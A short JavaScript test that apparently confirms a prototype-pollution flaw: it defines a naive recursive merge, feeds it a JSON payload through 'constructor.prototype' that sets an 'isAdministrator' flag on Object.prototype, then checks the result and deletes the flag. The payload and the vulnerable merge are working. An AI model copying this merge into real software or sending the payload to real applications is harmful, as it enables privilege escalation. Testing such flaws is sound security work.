function representativeLegacyMerge(target, source) {
  for (const key of Object.keys(source)) {
    const value = source[key];
    if (value !== null && typeof value === "object") {
      if (target[key] === undefined) target[key] = {};
      representativeLegacyMerge(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}

const patch = JSON.parse(
  '{"constructor":{"prototype":{"isAdministrator":true}}}',
);
try {
  representativeLegacyMerge({}, patch);
  if ({}.isAdministrator !== true) {
    throw new Error("recursive merge did not modify Object.prototype");
  }
  console.log("lock-resolved vulnerable merge modified Object.prototype");
} finally {
  delete Object.prototype.isAdministrator;
}
